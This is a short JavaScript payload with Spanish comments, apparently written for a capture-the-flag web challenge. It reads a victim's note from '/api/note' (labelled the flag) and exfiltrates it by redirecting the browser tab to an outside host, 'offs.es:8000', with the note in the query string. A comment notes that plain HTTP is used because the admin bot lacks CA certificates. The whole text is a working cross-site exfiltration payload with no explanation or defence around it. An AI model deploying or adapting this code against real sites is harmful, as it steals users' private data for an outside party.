(async () => {
  /* 1️⃣  lee la nota (la FLAG) */
  const { note } = await (await fetch('/api/note')).json();

  /* 2️⃣  exfiltra: la forma más fiable es redirigir la pestaña  */
  location = 'http://offs.es:8000/?f=' + encodeURIComponent(note);

  /*  🔸  usa HTTP plano, no HTTPS: la imagen del bot no tiene CA  */
})();

